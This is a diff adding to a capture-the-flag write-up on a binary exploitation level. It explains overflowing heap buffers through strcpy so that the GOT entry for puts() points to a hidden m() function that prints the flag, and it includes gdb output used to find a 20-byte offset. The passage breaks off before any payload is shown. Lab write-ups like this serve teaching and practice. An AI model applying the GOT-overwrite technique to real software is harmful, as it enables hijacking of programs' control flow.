@@ -74,4 +74,24 @@ In the `main()` as already said there will be 4 `malloc()` and the `strcpy()` wi
 ```
 From this we know the program is opening the file that contains our *flag* we just have to wait to it to open the file and call `fgets()` right after and store this value in a global variable <br>
 `0x080485e4 <+195>:	mov    DWORD PTR [esp],0x804996` <br> and this same variable is passed to `printf()` in the `m()` program that is never called, check the `m()` function above and you can see the same address being passed to `printf()` and four our happiness just before the `main()` funtions returns there's a call to `puts()` coincidence ?
-So
+So our goal here is to modify the address of the `GOT` table that contains the __address__ of `puts()` and place the __address__ of the `m()` functions instead so before returning from `main()` the program will call the `puts()` functions from the this modified __address__ and will call the function we want.<br>
+Let's get the _offset_ and prepare the _payload_
+```
+(gdb) r AAAAAAAAAAAAAAAAAAAAA BBBBBB
+Breakpoint 1, 0x080485a0 in main ()
+(gdb) n
+Single stepping until exit from function main,
+which has no line number information.
+
+Breakpoint 2, 0x080485bd in main ()
+(gdb) x/30xw $esp
+0xbffff6a0:	0x08040041	0xbffff8c4	0xb7fd0ff4	0xb7e5ee55
+0xbffff6b0:	0xb7fed280	0x00000000	0x0804a028	0x0804a008
+0xbffff6c0:	0x08048610	0x00000000	0x00000000	0xb7e454d3
+0xbffff6d0:	0x00000003	0xbffff764	0xbffff774	0xb7fdc858
+0xbffff6e0:	0x00000000	0xbffff71c	0xbffff774	0x00000000
+0xbffff6f0:	0x0804825c	0xb7fd0ff4	0x00000000	0x00000000
+0xbffff700:	0x00000000	0xb2243554	0x8560b144	0x00000000
+0xbffff710:	0x00000000	0x00000000
+```
+As we can see passing 'A' * 21 we overwrote by `one byte` the __address__ *0x08040041* so we know our *offset is 20*, build the *payload*<br>
